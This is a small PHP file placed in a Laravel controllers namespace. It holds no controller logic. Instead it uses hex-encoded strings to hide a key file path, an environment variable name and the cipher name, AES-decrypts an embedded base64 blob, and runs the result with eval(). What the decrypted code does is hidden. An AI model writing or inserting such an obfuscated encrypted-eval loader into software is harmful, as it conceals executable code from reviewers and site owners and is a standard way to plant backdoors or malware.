<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ve3HipVMjCBrPdSUccHh5w==');

$c=base64_decode(

'hpQfDG/RC3cE62EdDJH0O0xvGJ48KKNAVqCtB1UJB83r+Z3/1WKUFV/SH+UCEdP8i9LpN41vs7eX' .
'qcJIIDoV3Ka9F8zpnPCseshjAZiSB4fKaWBS6Ij0Ong/q8mUBTf2jDPtaEAGae+nIuohH1wtVwfw' .
'Ll2qqhrVHjd6i0fkYyAYYjQTIQC5cINzWSTp7XBp9+Y49EnDkPIDLpFpCjpjavcMpS53t3K9JtWd' .
'nSPHP1Mb3kdZg0HDKuZ14oQXnjy5tqp7P7zy25eY9ll3kMRJ9g=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

